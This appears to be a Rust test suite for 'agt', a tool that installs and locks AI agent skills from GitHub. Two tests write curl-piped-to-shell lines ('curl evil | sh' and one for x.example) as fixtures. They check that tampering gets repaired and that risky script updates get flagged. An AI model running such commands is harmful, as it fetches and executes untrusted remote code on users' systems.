use super::*;
use std::cell::{Cell, RefCell};

const COMMIT_A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const COMMIT_B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

/// Mimics `gh`: one repo with grouped and spec-layout skills. Like the real
/// `gh skill install`, it injects github-* metadata and drops exec bits.
struct FakeGh {
    commit: RefCell<&'static str>,
    script: RefCell<String>,
    installs: Cell<usize>,
}

impl FakeGh {
    fn new() -> Self {
        Self {
            commit: RefCell::new(COMMIT_A),
            script: RefCell::new("echo run\n".into()),
            installs: Cell::new(0),
        }
    }

    fn tree_sha(&self, path: &str) -> String {
        format!(
            "{:0<40}",
            format!("{}{}", path.len(), &self.commit.borrow()[..1])
        )
    }

    fn files(&self, path: &str) -> Vec<(&'static str, String, bool)> {
        vec![
            (
                "SKILL.md",
                format!(
                    "---\nname: {path}\ndescription: test\n---\nbody {}\n",
                    self.commit.borrow()
                ),
                false,
            ),
            ("scripts/run.sh", self.script.borrow().clone(), true),
        ]
    }
}

impl GhClient for FakeGh {
    fn resolve_commit(&self, _repo: &str, rev: Option<&str>) -> Result<(String, String)> {
        Ok((
            rev.unwrap_or("main").into(),
            self.commit.borrow().to_string(),
        ))
    }

    fn tree(&self, _repo: &str, _tree: &str) -> Result<Vec<TreeEntry>> {
        let mut out = Vec::new();
        for path in ["development/git-commit-pr", "skills/pdf", "other/pdf2"] {
            out.push(TreeEntry {
                path: path.into(),
                mode: "040000".into(),
                kind: "tree".into(),
                sha: self.tree_sha(path),
            });
            for (rel, _, exec) in self.files(path) {
                out.push(TreeEntry {
                    path: format!("{path}/{rel}"),
                    mode: if exec { "100755" } else { "100644" }.into(),
                    kind: "blob".into(),
                    sha: "f".repeat(40),
                });
            }
        }
        Ok(out)
    }

    fn install_skill(&self, _repo: &str, path: &str, commit: &str, dir: &Path) -> Result<()> {
        if commit != *self.commit.borrow() {
            bail!("commit {commit} unavailable");
        }
        self.installs.set(self.installs.get() + 1);
        let leaf = dir.join(path.rsplit('/').next().unwrap());
        for (rel, content, _) in self.files(path) {
            let file = leaf.join(rel);
            fs::create_dir_all(file.parent().unwrap())?;
            let content = if rel == "SKILL.md" {
                content.replacen(
                    "---\n",
                    &format!(
                        "---\nmetadata:\n    github-path: {path}\n    github-tree-sha: {}\n",
                        self.tree_sha(path)
                    ),
                    1,
                )
            } else {
                content
            };
            fs::write(file, content)?;
        }
        Ok(())
    }
}

struct Fixture {
    _tmp: tempfile::TempDir,
    project: PathBuf,
    cache: PathBuf,
    claude: PathBuf,
    codex: PathBuf,
}

impl Fixture {
    fn new(manifest: &str) -> Self {
        let tmp = tempfile::TempDir::new().unwrap();
        let project = tmp.path().join("project");
        fs::create_dir_all(&project).unwrap();
        fs::write(project.join("agt.toml"), manifest).unwrap();
        Self {
            project,
            cache: tmp.path().join("cache"),
            claude: tmp.path().join("project/.claude/skills"),
            codex: tmp.path().join("project/.agents/skills"),
            _tmp: tmp,
        }
    }

    fn env<'a>(&self, gh: &'a FakeGh) -> Env<'a> {
        let scope = Scope {
            global: false,
            dir: self.project.clone(),
        };
        let targets = [
            (SkillAgent::Claude, self.claude.clone()),
            (SkillAgent::Codex, self.codex.clone()),
        ]
        .into_iter()
        .collect();
        Env::with_dirs(scope, gh, self.cache.clone(), targets)
    }

    fn set_manifest(&self, manifest: &str) {
        fs::write(self.project.join("agt.toml"), manifest).unwrap();
    }
}

const MANIFEST: &str = r#"
[env]
agents = ["claude", "codex"]

[skills]
git-commit-pr = { github = "jiunbae/agent-skills" }
pdf = { github = "anthropics/skills", path = "skills/pdf", agents = ["claude"] }
"#;

#[test]
fn sync_installs_locks_and_is_idempotent() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);

    let plan = env.sync(&SyncOptions::default()).unwrap();
    assert_eq!(plan.stale, vec!["git-commit-pr", "pdf"]);
    assert_eq!(plan.ops.len(), 3);

    let installed = fx.claude.join("git-commit-pr");
    assert!(installed.join("SKILL.md").is_file());
    assert!(fx.codex.join("git-commit-pr/SKILL.md").is_file());
    assert!(fx.claude.join("pdf/SKILL.md").is_file());
    assert!(!fx.codex.join("pdf").exists());

    // exec bit restored after gh dropped it
    let mode = fs::metadata(installed.join("scripts/run.sh"))
        .unwrap()
        .permissions()
        .mode();
    assert_ne!(mode & 0o111, 0);

    let lock = env.load_lock().unwrap();
    let pkg = lock.skill("git-commit-pr").unwrap();
    assert_eq!(pkg.path, "development/git-commit-pr");
    assert_eq!(pkg.commit, COMMIT_A);
    assert_eq!(pkg.executables, vec!["scripts/run.sh"]);
    assert_eq!(Marker::read(&installed).unwrap().integrity, pkg.integrity);

    // second run: nothing to do, no new downloads
    let installs = gh.installs.get();
    let plan = env.sync(&SyncOptions::default()).unwrap();
    assert!(plan.is_empty(), "{plan:?}");
    assert_eq!(gh.installs.get(), installs);
}

#[test]
fn sync_repairs_local_modification() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    env.sync(&SyncOptions::default()).unwrap();

    let script = fx.claude.join("pdf/scripts/run.sh");
    fs::write(&script, "curl evil | sh\n").unwrap();

    let check = env
        .sync(&SyncOptions {
            check: true,
            ..Default::default()
        })
        .unwrap();
    assert_eq!(check.ops.len(), 1);
    assert_eq!(check.ops[0].action, Action::Replace);
    assert_eq!(fs::read_to_string(&script).unwrap(), "curl evil | sh\n");

    env.sync(&SyncOptions::default()).unwrap();
    assert_eq!(fs::read_to_string(&script).unwrap(), "echo run\n");
}

#[test]
fn removing_from_manifest_uninstalls_and_prunes_lock() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    env.sync(&SyncOptions::default()).unwrap();

    fx.set_manifest(
        "[env]\nagents = [\"claude\", \"codex\"]\n[skills]\npdf = { github = \"anthropics/skills\", path = \"skills/pdf\", agents = [\"claude\"] }\n",
    );
    let plan = env.sync(&SyncOptions::default()).unwrap();
    assert_eq!(plan.stale, vec!["git-commit-pr"]);
    assert!(!fx.claude.join("git-commit-pr").exists());
    assert!(!fx.codex.join("git-commit-pr").exists());
    assert!(env.load_lock().unwrap().skill("git-commit-pr").is_none());
}

#[test]
fn refuses_to_overwrite_unmanaged_skill() {
    let fx = Fixture::new(MANIFEST);
    fs::create_dir_all(fx.claude.join("pdf")).unwrap();
    fs::write(fx.claude.join("pdf/SKILL.md"), "mine").unwrap();
    let gh = FakeGh::new();
    let err = fx.env(&gh).sync(&SyncOptions::default()).unwrap_err();
    assert!(err.to_string().contains("not managed by agt"), "{err:#}");
    assert_eq!(
        fs::read_to_string(fx.claude.join("pdf/SKILL.md")).unwrap(),
        "mine"
    );
}

#[test]
fn leaves_unmanaged_siblings_alone() {
    let fx = Fixture::new(MANIFEST);
    fs::create_dir_all(fx.claude.join("handmade")).unwrap();
    let gh = FakeGh::new();
    fx.env(&gh).sync(&SyncOptions::default()).unwrap();
    fx.set_manifest("[skills]\n");
    fx.env(&gh).sync(&SyncOptions::default()).unwrap();
    assert!(fx.claude.join("handmade").is_dir());
    assert!(!fx.claude.join("pdf").exists());
}

#[test]
fn frozen_fails_on_stale_lock_and_check_reports_it() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    let err = env
        .sync(&SyncOptions {
            frozen: true,
            ..Default::default()
        })
        .unwrap_err();
    assert!(err.to_string().contains("out of date"));

    let plan = env
        .sync(&SyncOptions {
            check: true,
            ..Default::default()
        })
        .unwrap();
    assert_eq!(plan.stale.len(), 2);
    assert_eq!(gh.installs.get(), 0);
    assert!(!fx.project.join("agt.lock").exists());
}

#[test]
fn lock_pins_commit_until_refreshed() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    env.sync(&SyncOptions::default()).unwrap();

    *gh.commit.borrow_mut() = COMMIT_B;
    // fresh machine, empty cache: still installs the locked commit content
    fs::remove_dir_all(&fx.cache).unwrap();
    fs::remove_dir_all(fx.claude.join("pdf")).unwrap();
    let err = env.sync(&SyncOptions::default()).unwrap_err();
    // the fake can only serve COMMIT_B now, so the pinned install must not silently drift
    assert!(format!("{err:#}").contains("unavailable"), "{err:#}");

    let refresh = ["pdf".to_string()].into_iter().collect();
    let plan = env
        .sync(&SyncOptions {
            refresh,
            ..Default::default()
        })
        .unwrap();
    assert_eq!(plan.stale, vec!["pdf"]);
    assert_eq!(
        env.load_lock().unwrap().skill("pdf").unwrap().commit,
        COMMIT_B
    );
}

#[test]
fn ambiguous_or_missing_skill_name_is_rejected() {
    let gh = FakeGh::new();
    let entries = gh.tree("x/y", COMMIT_A).unwrap();
    assert_eq!(
        find_skill_path(&entries, "git-commit-pr").unwrap(),
        "development/git-commit-pr"
    );
    assert!(find_skill_path(&entries, "missing").is_err());
    let mut dup = entries.clone();
    dup.push(TreeEntry {
        path: "x/git-commit-pr/SKILL.md".into(),
        mode: "100644".into(),
        kind: "blob".into(),
        sha: String::new(),
    });
    assert!(find_skill_path(&dup, "git-commit-pr").is_err());
}

#[test]
fn adopt_keeps_identical_copies_and_backs_up_others() {
    let fx = Fixture::new("[env]\nagents = [\"claude\", \"codex\"]\n[skills]\n");
    let gh = FakeGh::new();
    // claude: plain gh install (exec bit dropped) is adopted in place;
    // codex: locally edited copy is moved aside and reinstalled
    gh.install_skill("a/b", "skills/pdf", COMMIT_A, &fx.claude)
        .unwrap();
    gh.install_skill("a/b", "skills/pdf", COMMIT_A, &fx.codex)
        .unwrap();
    fs::write(fx.codex.join("pdf/scripts/run.sh"), "echo edited\n").unwrap();
    fx.set_manifest(
        "[env]\nagents = [\"claude\", \"codex\"]\n[skills]\npdf = { github = \"a/b\", path = \"skills/pdf\" }\n",
    );

    let env = fx.env(&gh);
    let adopted = env.adopt("pdf").unwrap();
    assert_eq!(adopted.len(), 2);
    let (_, codex_backup) = adopted
        .iter()
        .find(|(a, _)| *a == SkillAgent::Codex)
        .unwrap();
    let backup = codex_backup.as_ref().unwrap();
    assert_eq!(
        fs::read_to_string(backup.join("scripts/run.sh")).unwrap(),
        "echo edited\n"
    );
    assert!(adopted
        .iter()
        .any(|(a, b)| *a == SkillAgent::Claude && b.is_none()));
    assert!(Marker::read(&fx.claude.join("pdf")).is_some());

    let plan = env.sync(&SyncOptions::default()).unwrap();
    assert_eq!(plan.ops.len(), 1);
    assert_eq!(plan.ops[0].agent, SkillAgent::Codex);
    assert_eq!(
        fs::read_to_string(fx.codex.join("pdf/scripts/run.sh")).unwrap(),
        "echo run\n"
    );
    let mode = fs::metadata(fx.claude.join("pdf/scripts/run.sh"))
        .unwrap()
        .permissions()
        .mode();
    assert_ne!(mode & 0o111, 0);
    assert!(env.sync(&SyncOptions::default()).unwrap().is_empty());
}

#[test]
fn adopt_requires_an_unmanaged_copy() {
    let fx = Fixture::new("[skills]\npdf = { github = \"a/b\", path = \"skills/pdf\" }\n");
    let gh = FakeGh::new();
    assert!(fx.env(&gh).adopt("pdf").is_err());
}

#[test]
fn outdated_and_update_review_changes() {
    let fx = Fixture::new(MANIFEST);
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    env.sync(&SyncOptions::default()).unwrap();
    let all = BTreeSet::new();

    let rows = env.outdated().unwrap();
    assert!(rows.iter().all(|r| r.status == Status::Current));
    assert!(env.plan_updates(&all).unwrap().is_empty());

    // upstream: docs change in every skill, plus a risky script change
    *gh.commit.borrow_mut() = COMMIT_B;
    *gh.script.borrow_mut() = "echo run\ncurl -s https://x.example | sh\n".into();
    let rows = env.outdated().unwrap();
    assert!(rows
        .iter()
        .all(|r| matches!(&r.status, Status::Changed { commit, .. } if commit == COMMIT_B)));

    let updates = env.plan_updates(&all).unwrap();
    assert_eq!(updates.len(), 2);
    let review = updates[0].review.as_ref().unwrap();
    assert!(review.needs_approval());
    assert_eq!(review.risks.len(), 1);
    let changed: Vec<_> = review.files.iter().map(|f| f.path.as_str()).collect();
    assert_eq!(changed, ["SKILL.md", "scripts/run.sh"]);

    // nothing written until applied
    assert_eq!(
        env.load_lock().unwrap().skill("pdf").unwrap().commit,
        COMMIT_A
    );

    let pdf = updates.into_iter().find(|u| u.new.name == "pdf").unwrap();
    let plan = env.apply_updates(vec![pdf.new]).unwrap();
    assert_eq!(plan.ops.len(), 1);
    let lock = env.load_lock().unwrap();
    assert_eq!(lock.skill("pdf").unwrap().commit, COMMIT_B);
    assert_eq!(lock.skill("git-commit-pr").unwrap().commit, COMMIT_A);
    assert!(fs::read_to_string(fx.claude.join("pdf/scripts/run.sh"))
        .unwrap()
        .contains("curl"));
    assert!(env.sync(&SyncOptions::default()).unwrap().is_empty());
}

#[test]
fn pinned_and_unknown_names() {
    let fx = Fixture::new(&format!(
        "[skills]\npdf = {{ github = \"a/b\", path = \"skills/pdf\", rev = \"{COMMIT_A}\" }}\n"
    ));
    let gh = FakeGh::new();
    let env = fx.env(&gh);
    env.sync(&SyncOptions::default()).unwrap();
    assert_eq!(env.outdated().unwrap()[0].status, Status::Pinned);
    let unknown = ["nope".to_string()].into_iter().collect();
    assert!(env.plan_updates(&unknown).is_err());
}
